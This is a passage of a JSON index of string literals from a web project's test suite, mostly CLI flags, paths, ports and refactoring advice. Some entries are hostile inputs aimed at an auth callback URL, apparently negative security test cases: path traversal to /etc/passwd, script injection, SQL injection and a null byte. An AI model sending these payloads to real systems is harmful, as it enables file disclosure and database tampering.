        "--noEmit": {
          "value": "--noEmit",
          "category": "test_literals",
          "locations": []
        },
        "--optimization": {
          "value": "--optimization",
          "category": "test_literals",
          "locations": []
        },
        "--output": {
          "value": "--output",
          "category": "test_literals",
          "locations": []
        },
        "--parallel": {
          "value": "--parallel",
          "category": "test_literals",
          "locations": []
        },
        "--passWithNoTests": {
          "value": "--passWithNoTests",
          "category": "test_literals",
          "locations": []
        },
        "--port": {
          "value": "--port",
          "category": "test_literals",
          "locations": []
        },
        "--profile": {
          "value": "--profile",
          "category": "test_literals",
          "locations": []
        },
        "--project-root": {
          "value": "--project-root",
          "category": "test_literals",
          "locations": []
        },
        "--quick": {
          "value": "--quick",
          "category": "test_literals",
          "locations": []
        },
        "--quiet": {
          "value": "--quiet",
          "category": "test_literals",
          "locations": []
        },
        "--real-e2e": {
          "value": "--real-e2e",
          "category": "test_literals",
          "locations": []
        },
        "--reload": {
          "value": "--reload",
          "category": "test_literals",
          "locations": []
        },
        "--repo": {
          "value": "--repo",
          "category": "test_literals",
          "locations": []
        },
        "--report": {
          "value": "--report",
          "category": "test_literals",
          "locations": []
        },
        "--report-only": {
          "value": "--report-only",
          "category": "test_literals",
          "locations": []
        },
        "--root-dir": {
          "value": "--root-dir",
          "category": "test_literals",
          "locations": []
        },
        "--run-id": {
          "value": "--run-id",
          "category": "test_literals",
          "locations": []
        },
        "--scan": {
          "value": "--scan",
          "category": "test_literals",
          "locations": []
        },
        "--scan-all": {
          "value": "--scan-all",
          "category": "test_literals",
          "locations": []
        },
        "--secret-file": {
          "value": "--secret-file",
          "category": "test_literals",
          "locations": []
        },
        "--self-contained-html": {
          "value": "--self-contained-html",
          "category": "test_literals",
          "locations": []
        },
        "--show-warnings": {
          "value": "--show-warnings",
          "category": "test_literals",
          "locations": []
        },
        "--simulate": {
          "value": "--simulate",
          "category": "test_literals",
          "locations": []
        },
        "--spec": {
          "value": "--spec",
          "category": "test_literals",
          "locations": []
        },
        "--strategy": {
          "value": "--strategy",
          "category": "test_literals",
          "locations": []
        },
        "--strict": {
          "value": "--strict",
          "category": "test_literals",
          "locations": []
        },
        "--strict-markers": {
          "value": "--strict-markers",
          "category": "test_literals",
          "locations": []
        },
        "--tb=no": {
          "value": "--tb=no",
          "category": "test_literals",
          "locations": []
        },
        "--tb=short": {
          "value": "--tb=short",
          "category": "test_literals",
          "locations": []
        },
        "--testMatch": {
          "value": "--testMatch",
          "category": "test_literals",
          "locations": []
        },
        "--testNamePattern=": {
          "value": "--testNamePattern=",
          "category": "test_literals",
          "locations": []
        },
        "--testPathPattern=__tests__/(components|hooks|store)": {
          "value": "--testPathPattern=__tests__/(components|hooks|store)",
          "category": "test_literals",
          "locations": []
        },
        "--timeout=5": {
          "value": "--timeout=5",
          "category": "test_literals",
          "locations": []
        },
        "--token": {
          "value": "--token",
          "category": "test_literals",
          "locations": []
        },
        "--type-check": {
          "value": "--type-check",
          "category": "test_literals",
          "locations": []
        },
        "--update-snapshots": {
          "value": "--update-snapshots",
          "category": "test_literals",
          "locations": []
        },
        "--updateSnapshot": {
          "value": "--updateSnapshot",
          "category": "test_literals",
          "locations": []
        },
        "--validate-tests": {
          "value": "--validate-tests",
          "category": "test_literals",
          "locations": []
        },
        "--verbose": {
          "value": "--verbose",
          "category": "test_literals",
          "locations": []
        },
        "--version": {
          "value": "--version",
          "category": "test_literals",
          "locations": []
        },
        "--wait-for-completion": {
          "value": "--wait-for-completion",
          "category": "test_literals",
          "locations": []
        },
        "--wait-for-completion requires --workflow-name": {
          "value": "--wait-for-completion requires --workflow-name",
          "category": "test_literals",
          "locations": []
        },
        "--watch": {
          "value": "--watch",
          "category": "test_literals",
          "locations": []
        },
        "--workflow-name": {
          "value": "--workflow-name",
          "category": "test_literals",
          "locations": []
        },
        "-01": {
          "value": "-01",
          "category": "test_literals",
          "locations": []
        },
        "->": {
          "value": "->",
          "category": "test_literals",
          "locations": []
        },
        "-P": {
          "value": "-P",
          "category": "test_literals",
          "locations": []
        },
        "-W": {
          "value": "-W",
          "category": "test_literals",
          "locations": []
        },
        "-_": {
          "value": "-_",
          "category": "test_literals",
          "locations": []
        },
        "-b": {
          "value": "-b",
          "category": "test_literals",
          "locations": []
        },
        "-c": {
          "value": "-c",
          "category": "test_literals",
          "locations": []
        },
        "-e": {
          "value": "-e",
          "category": "test_literals",
          "locations": []
        },
        "-f": {
          "value": "-f",
          "category": "test_literals",
          "locations": []
        },
        "-h": {
          "value": "-h",
          "category": "test_literals",
          "locations": []
        },
        "-k": {
          "value": "-k",
          "category": "test_literals",
          "locations": []
        },
        "-l": {
          "value": "-l",
          "category": "test_literals",
          "locations": []
        },
        "-m": {
          "value": "-m",
          "category": "test_literals",
          "locations": []
        },
        "-n": {
          "value": "-n",
          "category": "test_literals",
          "locations": []
        },
        "-name": {
          "value": "-name",
          "category": "test_literals",
          "locations": []
        },
        "-o": {
          "value": "-o",
          "category": "test_literals",
          "locations": []
        },
        "-p": {
          "value": "-p",
          "category": "test_literals",
          "locations": []
        },
        "-q": {
          "value": "-q",
          "category": "test_literals",
          "locations": []
        },
        "-rN": {
          "value": "-rN",
          "category": "test_literals",
          "locations": []
        },
        "-s": {
          "value": "-s",
          "category": "test_literals",
          "locations": []
        },
        "-t": {
          "value": "-t",
          "category": "test_literals",
          "locations": []
        },
        "-type": {
          "value": "-type",
          "category": "test_literals",
          "locations": []
        },
        "-u": {
          "value": "-u",
          "category": "test_literals",
          "locations": []
        },
        "-v": {
          "value": "-v",
          "category": "test_literals",
          "locations": []
        },
        "-vv": {
          "value": "-vv",
          "category": "test_literals",
          "locations": []
        },
        "-w": {
          "value": "-w",
          "category": "test_literals",
          "locations": []
        },
        "-x": {
          "value": "-x",
          "category": "test_literals",
          "locations": []
        },
        "-xvs": {
          "value": "-xvs",
          "category": "test_literals",
          "locations": []
        },
        ".": {
          "value": ".",
          "category": "test_literals",
          "locations": []
        },
        ". Consider consolidating or improving test coverage.": {
          "value": ". Consider consolidating or improving test coverage.",
          "category": "test_literals",
          "locations": []
        },
        ". [": {
          "value": ". [",
          "category": "test_literals",
          "locations": []
        },
        ". `": {
          "value": ". `",
          "category": "test_literals",
          "locations": []
        },
        ".\"\"\"": {
          "value": ".\"\"\"",
          "category": "test_literals",
          "locations": []
        },
        ".\"\"\"\n    return {\"status\": \"ok\"}": {
          "value": ".\"\"\"\n    return {\"status\": \"ok\"}",
          "category": "test_literals",
          "locations": []
        },
        "...": {
          "value": "...",
          "category": "test_literals",
          "locations": []
        },
        "... and": {
          "value": "... and",
          "category": "test_literals",
          "locations": []
        },
        "../../../etc/passwd": {
          "value": "../../../etc/passwd",
          "category": "test_literals",
          "locations": []
        },
        "../reports/frontend-coverage": {
          "value": "../reports/frontend-coverage",
          "category": "test_literals",
          "locations": []
        },
        ".1%": {
          "value": ".1%",
          "category": "test_literals",
          "locations": []
        },
        ".1f": {
          "value": ".1f",
          "category": "test_literals",
          "locations": []
        },
        ".2f": {
          "value": ".2f",
          "category": "test_literals",
          "locations": []
        },
        ".3f": {
          "value": ".3f",
          "category": "test_literals",
          "locations": []
        },
        ".4f": {
          "value": ".4f",
          "category": "test_literals",
          "locations": []
        },
        ".6f": {
          "value": ".6f",
          "category": "test_literals",
          "locations": []
        },
        ".<40": {
          "value": ".<40",
          "category": "test_literals",
          "locations": []
        },
        ".cache": {
          "value": ".cache",
          "category": "test_literals",
          "locations": []
        },
        ".coverage": {
          "value": ".coverage",
          "category": "test_literals",
          "locations": []
        },
        ".db": {
          "value": ".db",
          "category": "test_literals",
          "locations": []
        },
        ".eggs": {
          "value": ".eggs",
          "category": "test_literals",
          "locations": []
        },
        ".env": {
          "value": ".env",
          "category": "test_literals",
          "locations": []
        },
        ".env.test": {
          "value": ".env.test",
          "category": "test_literals",
          "locations": []
        },
        ".env.test*": {
          "value": ".env.test*",
          "category": "test_literals",
          "locations": []
        },
        ".git": {
          "value": ".git",
          "category": "test_literals",
          "locations": []
        },
        ".github": {
          "value": ".github",
          "category": "test_literals",
          "locations": []
        },
        ".idea": {
          "value": ".idea",
          "category": "test_literals",
          "locations": []
        },
        ".invalid_signature": {
          "value": ".invalid_signature",
          "category": "test_literals",
          "locations": []
        },
        ".js": {
          "value": ".js",
          "category": "test_literals",
          "locations": []
        },
        ".json": {
          "value": ".json",
          "category": "test_literals",
          "locations": []
        },
        ".jsx": {
          "value": ".jsx",
          "category": "test_literals",
          "locations": []
        },
        ".mypy_cache": {
          "value": ".mypy_cache",
          "category": "test_literals",
          "locations": []
        },
        ".py": {
          "value": ".py",
          "category": "test_literals",
          "locations": []
        },
        ".pytest_cache": {
          "value": ".pytest_cache",
          "category": "test_literals",
          "locations": []
        },
        ".return_value =": {
          "value": ".return_value =",
          "category": "test_literals",
          "locations": []
        },
        ".ruff_cache": {
          "value": ".ruff_cache",
          "category": "test_literals",
          "locations": []
        },
        ".secrets": {
          "value": ".secrets",
          "category": "test_literals",
          "locations": []
        },
        ".service_discovery": {
          "value": ".service_discovery",
          "category": "test_literals",
          "locations": []
        },
        ".signature": {
          "value": ".signature",
          "category": "test_literals",
          "locations": []
        },
        ".tampered": {
          "value": ".tampered",
          "category": "test_literals",
          "locations": []
        },
        ".test": {
          "value": ".test",
          "category": "test_literals",
          "locations": []
        },
        ".test.": {
          "value": ".test.",
          "category": "test_literals",
          "locations": []
        },
        ".test.ts": {
          "value": ".test.ts",
          "category": "test_literals",
          "locations": []
        },
        ".test.tsx": {
          "value": ".test.tsx",
          "category": "test_literals",
          "locations": []
        },
        ".test_backups_": {
          "value": ".test_backups_",
          "category": "test_literals",
          "locations": []
        },
        ".tox": {
          "value": ".tox",
          "category": "test_literals",
          "locations": []
        },
        ".ts": {
          "value": ".ts",
          "category": "test_literals",
          "locations": []
        },
        ".tsx": {
          "value": ".tsx",
          "category": "test_literals",
          "locations": []
        },
        ".venv": {
          "value": ".venv",
          "category": "test_literals",
          "locations": []
        },
        ".vs": {
          "value": ".vs",
          "category": "test_literals",
          "locations": []
        },
        ".vscode": {
          "value": ".vscode",
          "category": "test_literals",
          "locations": []
        },
        ".yaml": {
          "value": ".yaml",
          "category": "test_literals",
          "locations": []
        },
        "/": {
          "value": "/",
          "category": "test_literals",
          "locations": []
        },
        "/ directory...": {
          "value": "/ directory...",
          "category": "test_literals",
          "locations": []
        },
        "/**/*.test.[jt]s?(x)": {
          "value": "/**/*.test.[jt]s?(x)",
          "category": "test_literals",
          "locations": []
        },
        "/__init__.py": {
          "value": "/__init__.py",
          "category": "test_literals",
          "locations": []
        },
        "/_next/static": {
          "value": "/_next/static",
          "category": "test_literals",
          "locations": []
        },
        "/`": {
          "value": "/`",
          "category": "test_literals",
          "locations": []
        },
        "/`:": {
          "value": "/`:",
          "category": "test_literals",
          "locations": []
        },
        "/api/health": {
          "value": "/api/health",
          "category": "test_literals",
          "locations": []
        },
        "/api/threads": {
          "value": "/api/threads",
          "category": "test_literals",
          "locations": []
        },
        "/api/user/me": {
          "value": "/api/user/me",
          "category": "test_literals",
          "locations": []
        },
        "/api/v1/threads": {
          "value": "/api/v1/threads",
          "category": "test_literals",
          "locations": []
        },
        "/api/v1/threads/": {
          "value": "/api/v1/threads/",
          "category": "test_literals",
          "locations": []
        },
        "/api/v1/user/profile": {
          "value": "/api/v1/user/profile",
          "category": "test_literals",
          "locations": []
        },
        "/app/tests/integration/": {
          "value": "/app/tests/integration/",
          "category": "test_literals",
          "locations": []
        },
        "/auth/": {
          "value": "/auth/",
          "category": "test_literals",
          "locations": []
        },
        "/auth/callback": {
          "value": "/auth/callback",
          "category": "test_literals",
          "locations": []
        },
        "/auth/callback/google": {
          "value": "/auth/callback/google",
          "category": "test_literals",
          "locations": []
        },
        "/auth/callback?": {
          "value": "/auth/callback?",
          "category": "test_literals",
          "locations": []
        },
        "/auth/callback?code=": {
          "value": "/auth/callback?code=",
          "category": "test_literals",
          "locations": []
        },
        "/auth/callback?code=../../../etc/passwd": {
          "value": "/auth/callback?code=../../../etc/passwd",
          "category": "test_literals",
          "locations": []
        },
        "/auth/callback?code=<script>&state=test": {
          "value": "/auth/callback?code=<script>&state=test",
          "category": "test_literals",
          "locations": []
        },
        "/auth/callback?code=test%00&state=test": {
          "value": "/auth/callback?code=test%00&state=test",
          "category": "test_literals",
          "locations": []
        },
        "/auth/callback?code=test&state=": {
          "value": "/auth/callback?code=test&state=",
          "category": "test_literals",
          "locations": []
        },
        "/auth/callback?code=test' OR '1'='1&state=test": {
          "value": "/auth/callback?code=test' OR '1'='1&state=test",
          "category": "test_literals",
          "locations": []
        },
        "/auth/callback?code=test; DROP TABLE users;&state=test": {
          "value": "/auth/callback?code=test; DROP TABLE users;&state=test",
          "category": "test_literals",
          "locations": []
        },
        "/auth/callback?code=test_code": {
          "value": "/auth/callback?code=test_code",
          "category": "test_literals",
          "locations": []
        },
        "/auth/callback?code=test_code&state=": {
          "value": "/auth/callback?code=test_code&state=",
          "category": "test_literals",
          "locations": []
        },
        "/auth/callback?code=test_code&state=test_state": {
          "value": "/auth/callback?code=test_code&state=test_state",
          "category": "test_literals",
          "locations": []
        },
        "/auth/callback?code=valid_code&state=": {
          "value": "/auth/callback?code=valid_code&state=",
          "category": "test_literals",
          "locations": []
        },
        "/auth/callback?error=access_denied&state=test_state": {
          "value": "/auth/callback?error=access_denied&state=test_state",
          "category": "test_literals",
          "locations": []
        },
        "/auth/callback?state=test": {
          "value": "/auth/callback?state=test",
          "category": "test_literals",
          "locations": []
        },
        "/auth/callback?state=test_state": {
          "value": "/auth/callback?state=test_state",
          "category": "test_literals",
          "locations": []
        },
        "/auth/config": {
          "value": "/auth/config",
          "category": "test_literals",
          "locations": []
        },
        "/auth/dev-login": {
          "value": "/auth/dev-login",
          "category": "test_literals",
          "locations": []
        },
        "/auth/health": {
          "value": "/auth/health",
          "category": "test_literals",
          "locations": []
        },
        "/auth/login": {
          "value": "/auth/login",
          "category": "test_literals",
          "locations": []
        },
        "/auth/login/google": {
          "value": "/auth/login/google",
          "category": "test_literals",
          "locations": []
        },
        "/auth/login?provider=": {
          "value": "/auth/login?provider=",
          "category": "test_literals",
          "locations": []
        },
        "/auth/login?provider=google": {
          "value": "/auth/login?provider=google",
          "category": "test_literals",
          "locations": []
        },
        "/auth/login?provider=google&scope=": {
          "value": "/auth/login?provider=google&scope=",
          "category": "test_literals",
          "locations": []
        },
        "/auth/login?provider=invalid_provider": {
          "value": "/auth/login?provider=invalid_provider",
          "category": "test_literals",
          "locations": []
        },
        "/auth/logout": {
          "value": "/auth/logout",
          "category": "test_literals",
          "locations": []
        },
        "/auth/password": {
          "value": "/auth/password",
          "category": "test_literals",
          "locations": []
        },
        "/auth/refresh": {
          "value": "/auth/refresh",
          "category": "test_literals",
          "locations": []
        },
        "/auth/service-token": {
          "value": "/auth/service-token",
          "category": "test_literals",
          "locations": []
        },
        "/auth/sessions": {
          "value": "/auth/sessions",
          "category": "test_literals",
          "locations": []
        },
        "/auth/sessions/": {
          "value": "/auth/sessions/",
          "category": "test_literals",
          "locations": []
        },
        "/auth/user": {
          "value": "/auth/user",
          "category": "test_literals",
          "locations": []
        },
        "/auth/validate": {
          "value": "/auth/validate",
          "category": "test_literals",
          "locations": []
        },
        "/auth/verify": {
          "value": "/auth/verify",
          "category": "test_literals",
          "locations": []
        },
        "/callback": {
          "value": "/callback",
          "category": "test_literals",
          "locations": []
        },
        "/cloudsql/": {
          "value": "/cloudsql/",
          "category": "test_literals",
          "locations": []
        },
        "/docs": {
          "value": "/docs",
          "category": "test_literals",
          "locations": []
        },
        "/e2e/": {
          "value": "/e2e/",
          "category": "test_literals",
          "locations": []
        },
        "/etc/passwd": {
          "value": "/etc/passwd",
          "category": "test_literals",
          "locations": []
        },
        "/health": {
          "value": "/health",
          "category": "test_literals",
          "locations": []
        },
        "/health/live": {
          "value": "/health/live",
          "category": "test_literals",
          "locations": []
        },
        "/health/ready": {
          "value": "/health/ready",
          "category": "test_literals",
          "locations": []
        },
        "/integration/": {
          "value": "/integration/",
          "category": "test_literals",
          "locations": []
        },
        "/messages": {
          "value": "/messages",
          "category": "test_literals",
          "locations": []
        },
        "/postgres": {
          "value": "/postgres",
          "category": "test_literals",
          "locations": []
        },
        "/secure": {
          "value": "/secure",
          "category": "test_literals",
          "locations": []
        },
        "/tests/": {
          "value": "/tests/",
          "category": "test_literals",
          "locations": []
        },
        "/tests/e2e/": {
          "value": "/tests/e2e/",
          "category": "test_literals",
          "locations": []
        },
        "/tests/integration/": {
          "value": "/tests/integration/",
          "category": "test_literals",
          "locations": []
        },
        "/tests/unified/e2e/": {
          "value": "/tests/unified/e2e/",
          "category": "test_literals",
          "locations": []
        },
        "/tests/unit/": {
          "value": "/tests/unit/",
          "category": "test_literals",
          "locations": []
        },
        "/unit/": {
          "value": "/unit/",
          "category": "test_literals",
          "locations": []
        },
        "/v1": {
          "value": "/v1",
          "category": "test_literals",
          "locations": []
        },
        "/ws": {
          "value": "/ws",
          "category": "test_literals",
          "locations": []
        },
        "/ws/config": {
          "value": "/ws/config",
          "category": "test_literals",
          "locations": []
        },
        "/ws/health": {
          "value": "/ws/health",
          "category": "test_literals",
          "locations": []
        },
        "0.0.0.0": {
          "value": "0.0.0.0",
          "category": "test_literals",
          "locations": []
        },
        "00-": {
          "value": "00-",
          "category": "test_literals",
          "locations": []
        },
        "1": {
          "value": "1",
          "category": "test_literals",
          "locations": []
        },
        "1' OR 1=1 UNION SELECT @@version --": {
          "value": "1' OR 1=1 UNION SELECT @@version --",
          "category": "test_literals",
          "locations": []
        },
        "1. **Fix Critical Violations First** - Address mock component implementations": {
          "value": "1. **Fix Critical Violations First** - Address mock component implementations",
          "category": "test_literals",
          "locations": []
        },
        "1. **Resource Utilization Analysis**\n           - GPU utilization averaging 67% with peaks at 95%\n           - Memory usage shows gradual increase pattern\n           - CPU bottleneck detected during data preprocessing\n        \n        2. **Cost Optimization Opportunities**\n           - Switch to spot instances for batch workloads (30% savings)\n           - Implement request batching for 40% throughput improvement\n           - Consider model quantization for inference optimization\n        \n        3. **Performance Recommendations**\n           - Enable tensor parallelism for large models\n           - Implement gradient checkpointing to reduce memory\n           - Use mixed precision training for 2x speedup\n        \n        4. **Scaling Considerations**\n           - Current setup can handle 10x load with modifications\n           - Recommend horizontal scaling for API endpoints\n           - Database connection pooling needs adjustment": {
          "value": "1. **Resource Utilization Analysis**\n           - GPU utilization averaging 67% with peaks at 95%\n           - Memory usage shows gradual increase pattern\n           - CPU bottleneck detected during data preprocessing\n        \n        2. **Cost Optimization Opportunities**\n           - Switch to spot instances for batch workloads (30% savings)\n           - Implement request batching for 40% throughput improvement\n           - Consider model quantization for inference optimization\n        \n        3. **Performance Recommendations**\n           - Enable tensor parallelism for large models\n           - Implement gradient checkpointing to reduce memory\n           - Use mixed precision training for 2x speedup\n        \n        4. **Scaling Considerations**\n           - Current setup can handle 10x load with modifications\n           - Recommend horizontal scaling for API endpoints\n           - Database connection pooling needs adjustment",
          "category": "test_literals",
          "locations": []
        },
        "1. Back up all files first": {
          "value": "1. Back up all files first",
          "category": "test_literals",
          "locations": []
        },
        "1. Check for missing dependencies: pip install -r requirements.txt": {
          "value": "1. Check for missing dependencies: pip install -r requirements.txt",
          "category": "test_literals",
          "locations": []
        },
        "1. Extract setup logic into fixture or helper method": {
          "value": "1. Extract setup logic into fixture or helper method",
          "category": "test_literals",
          "locations": []
        },
        "1. Missing mocks for external services (ClickHouse, Redis, WebSocket)": {
          "value": "1. Missing mocks for external services (ClickHouse, Redis, WebSocket)",
          "category": "test_literals",
          "locations": []
        },
        "1. Mock component function fix": {
          "value": "1. Mock component function fix",
          "category": "test_literals",
          "locations": []
        },
        "1. Move fixtures to appropriate service-level conftest.py": {
          "value": "1. Move fixtures to appropriate service-level conftest.py",
          "category": "test_literals",
          "locations": []
        },
        "1. Quick real e2e test (with mock services):": {
          "value": "1. Quick real e2e test (with mock services):",
          "category": "test_literals",
          "locations": []
        },
        "1. Review SPEC/no_test_stubs.xml for guidelines": {
          "value": "1. Review SPEC/no_test_stubs.xml for guidelines",
          "category": "test_literals",
          "locations": []
        },
        "1. Review the changes with: git diff": {
          "value": "1. Review the changes with: git diff",
          "category": "test_literals",
          "locations": []
        },
        "1. Review the report above": {
          "value": "1. Review the report above",
          "category": "test_literals",
          "locations": []
        },
        "1. Run tests to verify functionality: python unified_test_runner.py": {
          "value": "1. Run tests to verify functionality: python unified_test_runner.py",
          "category": "test_literals",
          "locations": []
        },
        "1. Split by test categories (unit/integration/e2e)": {
          "value": "1. Split by test categories (unit/integration/e2e)",
          "category": "test_literals",
          "locations": []
        },
        "1. Split by test categories:": {
          "value": "1. Split by test categories:",
          "category": "test_literals",
          "locations": []
        },
        "1. Test Size Validator - scans for violations": {
          "value": "1. Test Size Validator - scans for violations",
          "category": "test_literals",
          "locations": []
        },
        "1. Test Size Validator:": {
          "value": "1. Test Size Validator:",
          "category": "test_literals",
          "locations": []
        },
        "1. Test files MUST be ≤300 lines (SPEC/testing.xml)": {
          "value": "1. Test files MUST be ≤300 lines (SPEC/testing.xml)",
          "category": "test_literals",
          "locations": []
        },
        "1. `": {
          "value": "1. `",
          "category": "test_literals",
          "locations": []
        },
        "1.1.1.1,": {
          "value": "1.1.1.1,",
          "category": "test_literals",
          "locations": []
        },
        "10": {
          "value": "10",
          "category": "test_literals",
          "locations": []
        },
        "123": {
          "value": "123",
          "category": "test_literals",
          "locations": []
        },
        "123456": {
          "value": "123456",
          "category": "test_literals",
          "locations": []
        },
        "123456789": {
          "value": "123456789",
          "category": "test_literals",
          "locations": []
        },
        "127.0.0.1": {
          "value": "127.0.0.1",
          "category": "test_literals",
          "locations": []
        },
        "15": {
          "value": "15",
          "category": "test_literals",
          "locations": []
        },
        "192.168.1.1": {
          "value": "192.168.1.1",
          "category": "test_literals",
          "locations": []
        },
        "192.168.1.100": {
          "value": "192.168.1.100",
          "category": "test_literals",
          "locations": []
        },
        "2. **Extract Shared Utilities** - Move common mocks to test/fixtures directory": {
          "value": "2. **Extract Shared Utilities** - Move common mocks to test/fixtures directory",
          "category": "test_literals",
          "locations": []
        },
        "2. Check git status: git status": {
          "value": "2. Check git status: git status",
          "category": "test_literals",
          "locations": []
        },
        "2. Delete the violating conftest.py files": {
          "value": "2. Delete the violating conftest.py files",
          "category": "test_literals",
          "locations": []
        },
        "2. Full real e2e test (with actual LLM):": {
          "value": "2. Full real e2e test (with actual LLM):",
          "category": "test_literals",
          "locations": []
        },
        "2. Large file splitting": {
          "value": "2. Large file splitting",
          "category": "test_literals",
          "locations": []
        },
        "2. Look for circular imports in the error messages above": {
          "value": "2. Look for circular imports in the error messages above",
          "category": "test_literals",
          "locations": []
        },
        "2. Manually refactor files with violations": {
          "value": "2. Manually refactor files with violations",
          "category": "test_literals",
          "locations": []
        },
        "2. Replace test stubs with real implementations": {
          "value": "2. Replace test stubs with real implementations",
          "category": "test_literals",
          "locations": []
        },
        "2. Run mock-only tests: pytest -m mock_only": {
          "value": "2. Run mock-only tests: pytest -m mock_only",
          "category": "test_literals",
          "locations": []
        },
        "2. Split by functionality being tested": {
          "value": "2. Split by functionality being tested",
          "category": "test_literals",
          "locations": []
        },
        "2. Split by test classes:": {
          "value": "2. Split by test classes:",
          "category": "test_literals",
          "locations": []
        },
        "2. Split into multiple focused test cases": {
          "value": "2. Split into multiple focused test cases",
          "category": "test_literals",
          "locations": []
        },
        "2. Test Refactoring Helper - suggests splits": {
          "value": "2. Test Refactoring Helper - suggests splits",
          "category": "test_literals",
          "locations": []
        },
        "2. Test Refactoring Helper:": {
          "value": "2. Test Refactoring Helper:",
          "category": "test_literals",
          "locations": []
        },
        "2. Test functions MUST be ≤8 lines (SPEC/testing.xml)": {
          "value": "2. Test functions MUST be ≤8 lines (SPEC/testing.xml)",
          "category": "test_literals",
          "locations": []
        },
        "2. Tests expecting specific implementation details that have changed": {
          "value": "2. Tests expecting specific implementation details that have changed",
          "category": "test_literals",
          "locations": []
        },
        "2. Use dry-run mode to preview changes": {
          "value": "2. Use dry-run mode to preview changes",
          "category": "test_literals",
          "locations": []
        },
        "2.0": {
          "value": "2.0",
          "category": "test_literals",
          "locations": []
        },
        "20": {
          "value": "20",
          "category": "test_literals",
          "locations": []
        },
        "2d": {
          "value": "2d",
          "category": "test_literals",
          "locations": []
        },
        "3": {
          "value": "3",
          "category": "test_literals",
          "locations": []
        },
        "3. **Use Real Components** - Replace mocks with actual component instances": {
          "value": "3. **Use Real Components** - Replace mocks with actual component instances",
          "category": "test_literals",
          "locations": []
        },
        "3. Commit changes: git add . && git commit -m 'Standardize L3 test naming'": {
          "value": "3. Commit changes: git add . && git commit -m 'Standardize L3 test naming'",
          "category": "test_literals",
          "locations": []
        },
        "3. Extract assertion logic into helper methods": {
          "value": "3. Extract assertion logic into helper methods",
          "category": "test_literals",
          "locations": []
        },
        "3. Extract helper functions:": {
          "value": "3. Extract helper functions:",
          "category": "test_literals",
          "locations": []
        },
        "3. Function size reduction": {
          "value": "3. Function size reduction",
          "category": "test_literals",
          "locations": []
        },
        "3. Integration tests running as unit tests": {
          "value": "3. Integration tests running as unit tests",
          "category": "test_literals",
          "locations": []
        },
        "3. Manually refactor instead of using auto-fix": {
          "value": "3. Manually refactor instead of using auto-fix",
          "category": "test_literals",
          "locations": []
        },
        "3. Move test helpers to app/tests/ directory": {
          "value": "3. Move test helpers to app/tests/ directory",
          "category": "test_literals",
          "locations": []
        },
        "3. Run real service tests: ENABLE_REAL_LLM_TESTING=true pytest -m real_services": {
          "value": "3. Run real service tests: ENABLE_REAL_LLM_TESTING=true pytest -m real_services",
          "category": "test_literals",
          "locations": []
        },
        "3. Split by functionality, test type, or scenario": {
          "value": "3. Split by functionality, test type, or scenario",
          "category": "test_literals",
          "locations": []
        },
        "3. Split by test class if using class-based tests": {
          "value": "3. Split by test class if using class-based tests",
          "category": "test_literals",
          "locations": []
        },
        "3. Test Runner Integration - pre-run validation": {
          "value": "3. Test Runner Integration - pre-run validation",
          "category": "test_literals",
          "locations": []
        },
        "3. Test Runner Integration:": {
          "value": "3. Test Runner Integration:",
          "category": "test_literals",
          "locations": []
        },
        "3. Update test imports if necessary": {
          "value": "3. Update test imports if necessary",
          "category": "test_literals",
          "locations": []
        },
        "3. Use established patterns like fixtures and helper functions": {
          "value": "3. Use established patterns like fixtures and helper functions",
          "category": "test_literals",
          "locations": []
        },
        "3. Verify all module files exist and have no syntax errors": {
          "value": "3. Verify all module files exist and have no syntax errors",
          "category": "test_literals",
          "locations": []
        },
        "3. With specific LLM model:": {
          "value": "3. With specific LLM model:",
          "category": "test_literals",
          "locations": []
        },
        "300": {
          "value": "300",
          "category": "test_literals",
          "locations": []
        },
        "30s": {
          "value": "30s",
          "category": "test_literals",
          "locations": []
        },
        "3d": {
          "value": "3d",
          "category": "test_literals",
          "locations": []
        },
        "4": {
          "value": "4",
          "category": "test_literals",
          "locations": []
        },
        "4. **Mock External APIs Only** - Keep mocking limited to HTTP clients, databases": {
          "value": "4. **Mock External APIs Only** - Keep mocking limited to HTTP clients, databases",
          "category": "test_literals",
          "locations": []
        },
        "4. Check that __init__.py files exist in all package directories": {
          "value": "4. Check that __init__.py files exist in all package directories",
          "category": "test_literals",
          "locations": []
        },
        "4. Compliance Examples - properly sized tests": {
          "value": "4. Compliance Examples - properly sized tests",
          "category": "test_literals",
          "locations": []
        },
        "4. Extract common setup to fixtures or helper functions": {
          "value": "4. Extract common setup to fixtures or helper functions",
          "category": "test_literals",
          "locations": []
        },
        "4. Mock reduction in integration tests": {
          "value": "4. Mock reduction in integration tests",
          "category": "test_literals",
          "locations": []
        },
        "4. Move helper functions to separate test utilities module": {
          "value": "4. Move helper functions to separate test utilities module",
          "category": "test_literals",
          "locations": []
        },
        "4. Run 'python scripts/remove_test_stubs.py --scan' locally": {
          "value": "4. Run 'python scripts/remove_test_stubs.py --scan' locally",
          "category": "test_literals",
          "locations": []
        },
        "4. Run tests after each refactoring to ensure correctness": {
          "value": "4. Run tests after each refactoring to ensure correctness",
          "category": "test_literals",
          "locations": []
        },
        "4. Split by feature being tested:": {
          "value": "4. Split by feature being tested:",
          "category": "test_literals",
          "locations": []
        },
        "4. Use parameterized tests for multiple scenarios": {
          "value": "4. Use parameterized tests for multiple scenarios",
          "category": "test_literals",
          "locations": []
        },
        "4. View Examples:": {
          "value": "4. View Examples:",
          "category": "test_literals",
          "locations": []
        },
        "4d": {
          "value": "4d",
          "category": "test_literals",
          "locations": []
        },
        "5. **Split Large Functions** - Break down oversized test functions": {
          "value": "5. **Split Large Functions** - Break down oversized test functions",
          "category": "test_literals",
          "locations": []
        },
        "5. Use parameterized tests to reduce duplication": {
          "value": "5. Use parameterized tests to reduce duplication",
          "category": "test_literals",
          "locations": []
        },
        "5432": {
          "value": "5432",
          "category": "test_literals",
          "locations": []
        },
        "6": {
          "value": "6",
          "category": "test_literals",
          "locations": []
        },
        "6379": {
          "value": "6379",
          "category": "test_literals",
          "locations": []
        },
        "7": {
          "value": "7",
          "category": "test_literals",
          "locations": []
        },
        "8": {
          "value": "8",
          "category": "test_literals",
          "locations": []
        },
        "8000": {
          "value": "8000",
          "category": "test_literals",
          "locations": []
        },
        "999999999": {
          "value": "999999999",
          "category": "test_literals",
          "locations": []
        },
        ":": {
          "value": ":",
          "category": "test_literals",
          "locations": []
        },
        ":\n    \"\"\"Comprehensive test suite for": {
          "value": ":\n    \"\"\"Comprehensive test suite for",
          "category": "test_literals",
          "locations": []
        },
        ":\n    \"\"\"Test suite for": {
          "value": ":\n    \"\"\"Test suite for",
          "category": "test_literals",
          "locations": []
        },
        ": <not set>": {
          "value": ": <not set>",
          "category": "test_literals",
          "locations": []
        },
        ": Custom runner without ACT comment": {
